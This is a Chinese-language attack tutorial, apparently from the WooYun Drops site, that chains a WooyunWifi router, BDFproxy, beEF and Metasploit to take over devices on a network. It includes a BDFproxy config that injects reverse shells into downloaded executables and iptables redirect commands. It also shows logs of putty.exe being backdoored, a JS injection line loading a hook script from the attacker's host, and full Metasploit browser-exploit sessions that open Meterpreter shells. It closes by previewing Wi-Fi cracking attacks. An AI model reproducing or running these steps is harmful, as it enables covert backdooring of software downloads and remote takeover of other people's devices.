# WooyunWifi高级组合技&一套连击拿SHELL

0x00 概述
=======

* * *

十步之外，可取汝SHELL

本文介绍了使用WooyunWifi+BDFproxy+Metasploit的GETSHELL工具组合，并介绍了BDF的原理，并简要介绍了WooyunWifi+beEF+Metasploit的GETSHELL组合及其原理

本文使用的工具及缩写一览：

Backdoor Factory（后门工厂），缩写：bdf

Backdoor Factory Proxy（后门工厂代理器），缩写：bdfproxy

The Browser Exploitation Framework（浏览器漏洞利用框架），缩写：beEF

0x01 WooyunWifi相关功能简介
=====================

* * *

WooyunWifi路由器是一款用于无线网络安全测试&学习的智能路由器

在本文中，分别使用了WooyunWifi的流量转发功能、JS注入功能

流量转发功能可以让目标设备的流量转发至进行实际执行安全测试工具的设备上，即提供了免配置的中间人网络介入。中间人攻击的传统手法有ARP欺骗、DNS欺骗等，均需要其他安全工具配合，难度较大且物理条件要求苛刻（需要额外的设备接入同一网段，并且要关闭可能的Lan隔离及ARP防火墙）。因此，WooyunWifi提供的一键流量转发功能可以使您跳过网络层手工配置，直接使用任意设备对目标设备进行应用层的安全测试

JS注入功能可以提供简单的脚本注入，可以用来做启动更大脚本HOOK平台的跳板，举例说本文中介绍的beEF平台就是由JS注入功能初始化，然后直接HOOK住目标浏览器进行安全测试的。JS注入攻击的传统手法非常复杂，首先需要依赖于上文所说的网络层攻击，之后还要配合应用层的JS注入工具，最后才能开始使用beEF平台，由于前几步骤的难度极高，因此传统上相对更加简单的JS注入反而变得难以实施。因此，WooyunWifi自身集成的安全工具已经实现了JS注入功能，您可以简单地通过WEB界面进行JS注入，简单直接地对目标浏览器进行安全测试。

0x02 WooyunWifi+BDFproxy+Metasploit测试流程
=======================================

* * *

WooyunWifi的WEB配置：

在WooyunWifi的WEB界面中点击Settings（高级设置）按钮，在Traffic Redirect选项中填写流量转发的目标设备IP以及用于安全测试设备的IP，例：

[![](http://static.wooyun.org//drops/20150811/2015081103412148247.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/WooyunWificonfig.png)

192.168.1.134 是目标设备的IP，该IP的流量将被转发至Proxy IP

192.168.1.163 是安全测试设备的IP，该IP将接收到来自192.168.1.134的流量

bdfproxy配置：

如果您使用的是Kali Nethunter手机，您已经安装好bdfproxy了。如果您使用的是Kali Linux的老版本（我不确定新版本是否将包含bdfproxy），您可以使用

```
apt-get install bdfproxy

```

安装bdfproxy以及相关的依赖软件包

默认情况下，您极有可能安装bdfproxy至

```
/usr/share/bdfproxy

```

如果您是直接从git上获得并编译的源代码，请自己寻找您的bdfproxy配置文件的路径

默认的配置文件可能在/etc/bdfproxy下

修改其中的部分内容如下：

```
# 
#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
#   
#   Copyright (c) 2013-2014, Joshua Pitts
#   All rights reserved.
#

bdf以及bdfproxy的作者为Joshua Pitts，联系方式如上，He is awesome!!!

[Overall]
transparentProxy = transparent  # Modes: None, socks5, transparent, reverse, upstream
我们使用的是透明代理模式，默认的是常规代理模式，区别是常规代理模式通过浏览器设置代理然后通过代理协议传输数据（格式和普通HTTP请求不一样），而透明代理则完全是流量转发格式不变，因此我们在这里使用透明代理
MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
最大文件大小，过大的话会返回502页面，建议使用小文件测试
certLocation = ~/.mitmproxy/mitmproxy-ca.pem
这是mitm的依赖库需要的证书，如果您遇到的报错和这个有关，先手动运行一下mitmf
proxyPort = 8080
sslports = 443, 8443
loglevel = INFO
logname = proxy.log
resourceScript = bdfproxy_msf_resource.rc
这个是和Metasploit结合的resource文件，之后的命令部分和这个文件名有关


[targets]
//挂马的目标
    #MAKE SURE that your settings for host and port DO NOT
    # overlap between different types of payloads

    [[ALL]] # DEFAULT settings for all targets REQUIRED

    LinuxType = ALL     # choices: x86/x64/ALL/None
    WindowsType = ALL   # choices: x86/x64/ALL/None
    FatPriority = x64   # choices: x86 or x64

    FileSizeMax = 60000000  # ~60 MB (just under) No patching of files this large

    CompressedFiles = True #True/False
        [[[LinuxIntelx86]]]
        SHELL = reverse_shell_tcp   # This is the BDF syntax
        默认用的是BDF的reverse_shell_tcp，其他选项看BDF文档
        HOST = 192.168.1.163        # The C2
        这是PAYLOAD中的LHOST，就是开着Metasploit等着SHELL反弹的设备IP
        PORT = 8888
        端口不要和PROXY的重复了
        SUPPLIED_SHELLCODE = None
        MSFPAYLOAD = linux/x86/shell_reverse_tcp    # MSF syntax
        这个是Metasploit的PAYLOAD名称，相当于SET PAYLOAD命令

```

配置完毕之后，把Metasploit的服务打开，我们接下来要开启工具了：

```
iptables -A PREROUTING -t nat -i eth0 -p tcp -m multiport --dports 80,443 -j REDIRECT --to-port 8080

```

以上是第一步：将HTTP/HTTPS流量转发至bdfproxy

```
root@Alkaid-PC:~# bdfproxy 
[!] Writing resource script.
[!] Resource writen to bdfproxy_msf_resource.rc
[!] Starting BDFProxy
[!] Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com
********** REQUEST **********
[*] HOST:  203.208.48.142
[*] PATH:  /__utm.gif?utmwv=5.6.5&utms=22&utmn=842124717&utmhn=www.slideshare.net&utmt=event&utme=5(Newsfeed*Featured_time_on_page*440)8(member_type)9(FREE)11(1)&utmcs=UTF-8&utmsr=1920x1080&utmvp=1903x971&utmsc=24-bit&utmul=zh-cn&utmje=1&utmfl=18.0%20r0&utmdt=lxj616%E2%80%99s%20Newsfeed&utmhid=1466934019&utmr=http%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Freadtemplate%3Ft%3Dsafety%26check%3Dfalse%26gourl%3Dhttp%253A%252F%252Fwww.slideshare.net%252Fconfirm%252FODEwNDQ5Njg7MDA2Zjg0OWMzNjZiZmRmYTc0YWIwYzQyNzcyZGIzMjhjZTA2YmI5MA%253D%253D%253Futm_source%253Dconfirmemail%2526utm_medium%253Dssemail%2526utm_campaign%253Dconfirm_email%26subtemplate%3Dgray%26evil%3D0&utmp=%2Flxj616%2Fnewsfeed%3Fredirect%3D1&utmht=1439103172080&utmac=UA-2330466-1&utmni=1&utmcc=__utma%3D186399478.1272612003.1439088302.1439089490.1439090092.3%3B%2B__utmz%3D186399478.1439089490.2.2.utmcsr%3Dgoogle%7Cutmccn%3D(organic)%7Cutmcmd%3Dorganic%7Cutmctr%3D(not%2520provided)%3B&utmjid=&utmu=6RCAACAAAAAAAAAAAAAAAAAE~
********** END REQUEST **********

```

以上是第二步：开启bdfproxy，如果您配置正确，在目标设备访问网页时可以看到bdfproxy中截获的REQUEST如上所示

```
********** REQUEST **********
[*] HOST:  221.204.160.47
[*] PATH:  /sw-search-sp/soft/78/15699/putty_V0.63.0.0.43510830.exe
********** END REQUEST **********
========== RESPONSE ==========
[*] HOST:  221.204.160.47
[*] PATH:  /sw-search-sp/soft/78/15699/putty_V0.63.0.0.43510830.exe
[*] In the backdoor module
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win32 entry instructions
[*] Looking for and setting selected shellcode
[*] Creating win32 resume execution stub
[*] Looking for caves that will fit the minimum shellcode length of 638
[*] All caves lengths:  (638,)
############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? Use jump, single, append, or ignore.**
############################################################
[*] Cave 1 length as int: 638
[*] Available caves: 
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x294 End: 0xffc; Cave Size: 3432
2. Section Name: .rdata; Section Begin: 0x57000 End: 0x73000; Cave begin: 0x7262c End: 0x73000; Cave Size: 2516
3. Section Name: None; Section Begin: None End: None; Cave begin: 0x743d0 End: 0x7500a; Cave Size: 3130
**************************************************
[!] Enter your selection: 2
[!] Using selection: 2
[*] Changing Section Flags
[*] Patching initial entry instructions
[*] Creating win32 resume execution stub
[*] Looking for and setting selected shellcode
[*] Patching complete, forwarding to user.
========== END RESPONSE ==========

```

在目标设备通过HTTP下载文件时，您将在bdfproxy中看到拦截下的请求，提示您选择注入的CAVE，这里上面我选择了2，输入2然后回车，目标设备这时成功下载到putty.exe，看上去毫无异样。

[![](http://static.wooyun.org//drops/20150811/2015081103412187770.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/normalvideo.png)

以上截图出自WooyunWifi 2.0的视频，目前版本已经到达3.0，除了功能增强也有一个全新界面了

先不解释发生了什么，我们先来启动Metasploit：

```
root@Alkaid-PC:/usr/share/bdfproxy# msfconsole -r ./bdfproxy_msf_resource.rc 

```

请注意，这里的bdfproxy_msf_resource.rc正是我们上文中设置文件的名称，可能位于/usr/share/bdfproxy下面，如果您自己编译的bdfproxy，那您需要自己找这文件放哪里了

```
[*] Started reverse handler on 192.168.1.163:5555 
[*] Starting the payload handler...
msf exploit(handler) > [*] Sending stage (770048 bytes) to 192.168.1.134
[*] Meterpreter session 1 opened (192.168.1.163:8443 -> 192.168.1.134:57625) at 2015-08-09 14:58:22 +0800

```

可以看到启动时开启了一堆handler等待bdfproxy使用，当目标设备运行putty.exe时，显示Meterpreter session 1 opened，这时已经获取到了目标设备的SHELL

```
msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type   Information   Connection
  --  ----   -----------   ----------
  1   meterpreter x86/win32  FullMatelErLuLu\OrgeDaLuLu @ FULLMATELERLULU  192.168.1.163:8443 -> 192.168.1.134:57625 (192.168.1.134)

```

具体拿到SHELL之后怎么用，请参阅Metasploit的文档，这里就不细说了

0x03 BDF原理分析
============

* * *

首先，我们来看看我们大概做了一件什么事情：

目标设备->WooyunWifi路由器->安全测试设备（Kali+bdfproxy）->网站

那么发生了什么事情呢？

目标设备请求putty.exe->WooyunWifi路由器转发->安全测试设备（bdfproxy）拦截到请求->bdfproxy根据配置请求BDF挂后门->BDF请求Metasploit生成后门SHELLCODE->把SHELLCODE填进CAVE中（一会儿解释）->响应发回目标设备->目标设备下载完无异常于是执行->执行SHELLCODE->反弹SHELL给Metasploit

大家最关心的肯定是BDF挂后门时的CAVE是什么意思，下面以Joshua Pitts（BDF作者，He is awesome！！！）的PPT来翻译讲解BDF的原理，给出PPT原地址，翻译时格式有改动内容有删改：

http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory

Metasploit挂后门的方式：

```
msfvenom –p windows/shell_reverse_tcp –x psexec.exe … 这是覆盖掉原来程序入口点的方式

msfvenom –p windows/shell_reverse_tcp –x psexec.exe –k … 这是分配并创建一个新的线程然后跳转回原始程序入口点的方式（Keep 保留方式）

```

覆盖掉程序入口点之前：

[![](http://static.wooyun.org//drops/20150811/2015081103412210861.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/before_overwrite.png)

覆盖掉程序入口点之后：

[![](http://static.wooyun.org//drops/20150811/2015081103412273230.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/after.png)

覆盖程序入口点方式的好处和弊端：

```
好处：攻击者可以拿到SHELL
好处：EXE文件大小没有改变
坏处：程序无法继续执行（崩掉了）

```

创建新线程但是保留程序入口点方法：

[![](http://static.wooyun.org//drops/20150811/2015081103412269855.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/after_keep.png)

可以明显地看到新增了一个RWE的code section

[![](http://static.wooyun.org//drops/20150811/2015081103412223484.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/before_keep.png)

创建新线程但是保留程序入口点方法的好处和弊端：

```
好处：拿到SHELL并且程序可以继续执行
坏处：容易被杀毒软件侦测到
坏处：文件大小增加了

```

CTP方式挂后门：

添加一个新的code section，这和保留程序入口点的msfvenom Keep方式相似，然后使用存在的code Caves来加解密新加的code section中的SHELLCODE（我们尝试过xor加密，但是已经对杀毒软件没啥用了）

[![](http://static.wooyun.org//drops/20150811/2015081103412282155.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/ctp.png)

译者注：上图与keep方式比较相似，先跳到新加的code section然后跳回原来的程序入口点

那么，什么是Code Caves 呢？

[![](http://static.wooyun.org//drops/20150811/2015081103412293977.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/cc1.png)

Code Cave 是指在一个二进制文件中存在的一个全都是空字节（x00）的区域

编者注：如上图一堆x00的区域，就是一个Code Cave

Code Cave的产生与编译器有关：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

int array[600] = {0};

int main(int argc, char **argv)
{
    printf("hello world");
    return 0;
}

```

不同编译器下在section中大于200字节的Code Caves个数：

```
Cl.exe :  7
G++: 4
Mingw32-c++: 3
Lcc-win32: 0

```

BDF工作原理：

```
识别PE/COFF头格式

识别是否支持该二进制文件格式(win32/64 intel)

定位适用于指定SHELLCODE的Code Caves

试着挂后门并且让程序跳回原来状态继续执行

把入口点用JMP指到第一个选择的Code Cave或者添加的code section来挂到每个用户选择的Code Cave中

```

使用自定的SHELLCODE：

```
提醒一点，最好使用ExitFunction=Thread不然就会杀掉父进程，这样BDF就没用了

```

最后，对比一下文中所述的三种挂后门方式：

MSFVENOM –k –t exe

[![](http://static.wooyun.org//drops/20150811/2015081103412215141.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/vs001.png)

MSFVENOM –t exe

[![](http://static.wooyun.org//drops/20150811/2015081103412355213.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/vs002.png)

BDF Cave jumping

[![](http://static.wooyun.org//drops/20150811/2015081103412315115.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/vs003.png)

然后对比一下32位挂后门和64位挂后门的效果：

[![](http://static.wooyun.org//drops/20150811/2015081103412394651.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/vs004.png)

[![](http://static.wooyun.org//drops/20150811/2015081103412368243.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/vs005.png)

因此，BDF在自动化挂后门流程的同时，也实现了CTP方式挂后门的功能，这也就是之前手动选择Code Cave的原因，根据测试结果看来，Cave跳转方式过杀软的效果最好，而64位后门比32位后门的隐蔽性更高

0x04 WooyunWifi+beEF+Metasploit测试流程
===================================

* * *

WooyunWifi的WEB配置：

在WooyunWifi的WEB界面中点击Settings（高级设置）按钮，在jsInject选项中填写要注入的JS语句，例：

```
document.write("<script language='javascript' src='http://192.168.1.163:3000/hook.js'></script>");

```

[![](http://static.wooyun.org//drops/20150811/2015081103412369617.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/beefconfig.png)

我们注入的是JS语句，请不要混淆“JS语句”、“HTML标签”和“JS文件”的区别，在beEF中会自动生成hook.js并提示其URL地址，我们要想让beEF成功hook到目标浏览器，就要在目标浏览器上对应页面执行hook.js，因此我们使用JS语法document.write写入一个html标签，然后由标签来在当前页面加载hook.js（js执行的页面对beEF有重大影响，建议以这种方式在当前页面进行hook，您也可以尝试其他方式）

请先启动beef，Kali linux默认情况下集成了beEF，可以通过beef-xss命令启动，或者在快捷启动栏里也可以找到启动器

hook成功后，将在beef“Hooked Browsers”里面弹出上线的浏览器，在这里可以看到详细的浏览器信息

[![](http://static.wooyun.org//drops/20150811/2015081103412380701.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/beefpanel.png)

如图，目标浏览器为IE 9，并且支持Flash，使用老版本IE还开着Flash这基本上就是随意拿SHELL的了

上www.exploit-db.com找一个最新的exploit，比如hacking team的flash漏洞，放在msf的modules文件夹下，然后按照exploit代码mkdir并且touch一个可读写的swf文件（具体路径可以先运行报错一遍看看在哪）

但是，我是一个口是心非的人，因为我在hacking team事件当天就升级了Flash，降级基本上不可能，而且老版本如果一旦更新就是最新版，实在不想浪费时间去配置个Flash 18.0.0.194特定的版本

让我来用一个比较冷门的exploit演示Metasploit和beEF的组合用法：

```
msf exploit(ms14_012_textrange) > use  exploit/windows/browser/ie_unsafe_scripting
msf exploit(ie_unsafe_scripting) > info

   Name: Microsoft Internet Explorer Unsafe Scripting Misconfiguration
 Module: exploit/windows/browser/ie_unsafe_scripting
   Platform: Windows
   …………

msf exploit(ie_unsafe_scripting) > set SRVHOST 192.168.1.163
SRVHOST => 192.168.1.163
msf exploit(ie_unsafe_scripting) > set payload windows/messagebox
payload => windows/messagebox
msf exploit(ie_unsafe_scripting) > show options

Module options (exploit/windows/browser/ie_unsafe_scripting):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   SRVHOST  192.168.1.163    yes   The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      8080         yes   The local port to listen on.
   SSL         false               noNegotiate SSL for incoming connections
   SSLCert noPath to a custom SSL certificate (default is randomly generated)
   TECHNIQUE  VBS  yes   Delivery technique (VBS Exe Drop or PSH CMD) (accepted: VBS, Powershell)
   URIPATH       no                The URI to use for this exploit (default is random)


Payload options (windows/messagebox):

   Name  Current Setting   Required  Description
   ----  ---------------   --------  -----------
   EXITFUNC  process   yes   Exit technique (accepted: seh, thread, process, none)
   ICON  NOyes   Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION
   TEXT  Hello, from MSF!  yes   Messagebox Text (max 255 chars)
   TITLE MessageBoxyes   Messagebox Title (max 255 chars)


Exploit target:

   Id  Name
   --  ----
   0   Windows x86/x64


msf exploit(ie_unsafe_scripting) > set URIPATH /a
URIPATH => /a
msf exploit(ie_unsafe_scripting) > exploit
[*] Exploit running as background job.
msf exploit(ie_unsafe_scripting) > 
[*] Using URL: http://192.168.1.163:8080/a
[*] Server started.
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a

msf exploit(ie_unsafe_scripting) > set TECHNIQUE Powershell
TECHNIQUE => Powershell
msf exploit(ie_unsafe_scripting) > rerun
[*] Stopping existing job...

[*] Server stopped.
[*] Reloading module...
[*] Exploit running as background job.

msf exploit(ie_unsafe_scripting) > [*] Using URL: http://192.168.1.163:8080/a
[*] Server started.
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] Sending stage (972288 bytes) to 192.168.1.134
[*] Meterpreter session 1 opened (192.168.1.163:4446 -> 192.168.1.134:63098) at 2015-08-09 19:49:09 +0800
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] Sending stage (972288 bytes) to 192.168.1.134
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] Meterpreter session 2 opened (192.168.1.163:4446 -> 192.168.1.134:63099) at 2015-08-09 19:49:37 +0800
Interrupt: use the 'exit' command to quit
msf exploit(ie_unsafe_scripting) > set payload windows/messagebox
payload => windows/messagebox
msf exploit(ie_unsafe_scripting) > rerun
[*] Stopping existing job...

[*] Server stopped.
[*] Reloading module...
[*] Exploit running as background job.
msf exploit(ie_unsafe_scripting) > 
[*] Using URL: http://192.168.1.163:8080/a
[*] Server started.
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript

```

为了节省空间，上面演示的命令中我把我敲错的命令都自己删掉了 ：）

首先你在Metasploit里面要开启一个Browser Exploit的module，可能为了方便你喜欢手动设置uri为/a，payload可以是reverse shell，这里为了演示用的是MessageBox弹窗

然后在beEF里面让目标浏览器跳转至你的Browser Exploit的uri中，如图：

[![](http://static.wooyun.org//drops/20150811/2015081103412480714.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/2222.png)

之后目标浏览器就会访问我们设置好的Metasploit Browser Exploit页面，触发漏洞：

[![](http://static.wooyun.org//drops/20150811/2015081103412439194.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/hellomsf.png)

0x05 Browser Exploit组合原理科普
==========================

* * *

首先，看看我们做了一件什么事情：

目标设备发出浏览网页请求->WooyunWifi路由器不作改动->网站服务器->网站响应发回WooyunWifi路由器->WooyunWifi路由器在JS文件中插入写标签代码->WooyunWifi将修改后的响应发回目标设备->目标设备执行写标签代码->目标设备通过html标签加载并执行了安全测试设备上的hook.js代码->hook.js代码与安全测试设备上的beEF进行交互式的操作->beEF准备指令hook.js跳转至安全测试设备上的Metasploit Browser Exploit uri->目标设备当前页面受hook.js控制跳转至安全测试设备上的Metasploit Browser Exploit uri->Metasploit准备并发送浏览器攻击代码->目标设备浏览器被攻击后执行后门代码->目标设备后门代码与安全测试设备上的Metasploit进行交互->GETSHELL成功

那么，什么是Browser Exploit呢？Browser Exploit就是利用浏览器的漏洞来渗透目标设备的方法，常见的比如ie的漏洞都可能导致目标设备在访问恶意页面后直接被GETSHELL，另外其他的比如Flash漏洞也都是可以通过浏览器来触发的，因此也可纳于Browser Exploit范畴

```
Metasploit的浏览器攻击方式为建立一个uri以供目标设备访问，之后对特定的uri执行特定的漏洞利用模块

而beEF可以收集浏览器的信息，比如版本、插件、安全设置等等，可以根据beEF的信息选择Metasploit所要选择的漏洞利用模块

WooyunWifi可以使目标设备的浏览器毫无痕迹地执行hook.js，这样可以与beEF进行交互，再由beEF指令目标设备跳转至Metasploit uri

```

0x06 结语
=======

* * *

WooyunWifi不是一个黑客路由器，它只是一个用来研究、学习、交流的集成测试平台，请自觉遵守相关法律法规。该路由器仅在乌云集市中以平台积分形式赞助给在乌云平台上做过卓越贡献的白帽子，我们认为这些白帽子具备合格的安全知识能力及职业道德素质，兑换该路由器即保证仅用于学习研究用途。

那么，目标设备是怎么连上WooyunWifi的呢？破解WPA/WPA2握手包 + 5种方式秒杀无客户端连接嗅探不到包的WEP + 半握手包破解 + WPS在线暴力/pixie dust离线破解WPS-PIN + de-authentication掉线攻击 + KARMA混杂响应劫持手机扫描 + 利用大数据制作更好的弱密码字典，欲知后事如何 且听下回分解~